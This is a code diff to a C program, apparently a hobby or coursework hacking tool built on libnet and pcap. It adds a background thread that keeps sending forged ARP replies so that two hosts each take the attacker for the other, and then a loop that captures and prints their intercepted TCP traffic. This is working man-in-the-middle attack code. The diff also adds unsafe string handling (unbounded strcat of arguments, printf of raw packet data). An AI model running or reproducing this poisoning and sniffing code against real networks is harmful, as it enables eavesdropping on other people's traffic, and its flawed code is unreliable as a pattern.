@@ -1,8 +1,20 @@
 #include "header/arp.h"
 #include <pcap.h>
 #include "header/hacking.h"
+#include <unistd.h>
+#include <pthread.h>
 
-void set_packet_filter(pcap_t *handle);
+void set_packet_filter(pcap_t *handle, char *filter_opt);
+
+void arp_poison_thread(void *arg_ptr);
+
+struct data_pass
+{
+    libnet_t* l;
+    uint32_t target1_ip, target2_ip;
+    uint8_t *target1_mac, *target2_mac;
+
+};
 
 void usage(char* name)
 {
@@ -25,11 +37,14 @@ char pic[] =
 "       (@           `--------`\n";
 
 
+#define ARP_POISON_FREQUENCY 3
+
 int main(int argc, char *argv[])
 {
     libnet_t *l;
     pcap_t *handle;
     pcap_if_t *ift;
+    struct pcap_pkthdr pkthdr;
 
     u_char errbuf[LIBNET_ERRBUF_SIZE];
 
@@ -38,6 +53,17 @@ int main(int argc, char *argv[])
 
     uint8_t *target1_mac;
     uint8_t *target2_mac;
+
+    // TCP Connection
+    const u_char *packet;
+    const u_char *data;
+    char filter_str[200];
+    const struct libnet_tcp_hdr *current_connection;
+
+    // Multithreading
+    struct data_pass poison_data;
+    pthread_t t_poison;
+
 
     if(argc < 3)
         usage(argv[0]);
@@ -74,7 +100,7 @@ int main(int argc, char *argv[])
     */
 
     // Set packet filter for incoming ARP-Packets
-    set_packet_filter(handle);
+    set_packet_filter(handle, "arp");
     
     // Request Target 1
     printf("\nZiel \033[32m#1\033[39m: sende ARP-requests... \n");
@@ -85,9 +111,9 @@ int main(int argc, char *argv[])
 
     /* Loop goes on until a matching ARP-reply is found */
 
-    while(arp_receive(handle, target1_ip, target2_mac) != 0) arp_request(target1_ip, l);
+    //while(arp_receive(handle, target1_ip, target2_mac) != 0) {sleep(1); arp_request(target1_ip, l);}
     
-    printf("\033[33m\n-------------------------------\033[39m\n\n");
+    printf("\n-------------------------------\n\n");
 
     // Request Target 2
     printf("Ziel \033[34m#2\033[39m: sende ARP-requests... \n");
@@ -95,27 +121,57 @@ int main(int argc, char *argv[])
 
     // Receive Target 2
     printf("Ziel \033[34m#2\033[39m: suche nach ARP-replys...\n");
-    while(arp_receive(handle, target2_ip, target2_mac) != 0) arp_request(target2_ip, l);
+    // while(arp_receive(handle, target2_ip, target2_mac) != 0) {sleep(1); arp_request(target2_ip, l);}
 
     /* 
-        Start ARP-Poisoning
-    */
+        Start ARP-Poisoning on different thread
+    */  
 
-    printf("\n\t\tStarte ARP-Poisoning\n%s", pic);
+    printf("\n\t sendet ARP-Replies aller %d Sekunden. ^^\n%s\n", ARP_POISON_FREQUENCY, pic);
 
-    // send a fake arp-reply to target 1 pretending to be target 2
-    arp_reply(target2_ip, target1_ip, target1_mac, l);
+    poison_data.l = l;
+    poison_data.target1_ip = target1_ip;
+    poison_data.target2_ip = target2_ip;
+    poison_data.target1_mac = target1_mac;
+    poison_data.target2_mac = target2_mac;
 
-   // send a fake arp-reply to target 2 pretending to be target 1
-    arp_reply(target1_ip, target2_ip, target2_mac, l);
+    // create new thread for executing the arp_poison function
+    pthread_create(&t_poison, NULL, arp_poison_thread, &poison_data);
 
+    // make filter for tcp
+    strcpy(filter_str, "tcp and (dst host ");
+    strcat(filter_str, argv[1]);
+    strcat(filter_str, " or dst host ");
+    strcat(filter_str, argv[2]);
+    strcat(filter_str, ") and (src host ");
+    strcat(filter_str, argv[1]);
+    strcat(filter_str, " or src host ");
+    strcat(filter_str, argv[2]);
+    strcat(filter_str, ")");
+    
+    // Set packet filter for TCP
+    set_packet_filter(handle, filter_str);
+    set_packet_filter(handle, "tcp");
+
+    // main loop intercepting packets and displaying them
+    while(1)
+    {
+        packet = pcap_next(handle, &pkthdr);
+        printf("got %d bytes packet\n", pkthdr.len);
+        current_connection = packet + LIBNET_ETH_H + LIBNET_IPV4_H;
+        data = current_connection + LIBNET_TCP_H;
+        printf("Port is %d, message could be %s\n",ntohs(current_connection->th_dport), data + 2);
+        printf(data);
+        fflush(stdout);
+    }
+    
 }
 
-void set_packet_filter(pcap_t *handle)
+void set_packet_filter(pcap_t *handle, char *filter_opt)
 {
     struct bpf_program filter;
     char filter_string[200];
-    sprintf(filter_string, "arp");
+    strncpy(filter_string, filter_opt, 200);
     printf("[DEBUG] filter string ist %s\n", filter_string);
 
     if(pcap_compile(handle, &filter, filter_string, 0, 0) == -1)
@@ -130,4 +186,18 @@ void set_packet_filter(pcap_t *handle)
         exit(EXIT_FAILURE);
     }
 
+}
+
+void arp_poison_thread(void *arg_ptr)
+{
+
+    struct data_pass *passed_data = arg_ptr;
+    while(1) 
+    {
+        sleep(ARP_POISON_FREQUENCY);
+        //send a fake arp-reply to target 1 pretending to be target 2
+        arp_reply(passed_data->target2_ip, passed_data->target1_ip, passed_data->target1_mac, passed_data->l);
+        //send a fake arp-reply to target 2 pretending to be target 1
+        arp_reply(passed_data->target1_ip, passed_data->target2_ip, passed_data->target2_mac, passed_data->l);
+    }
 }
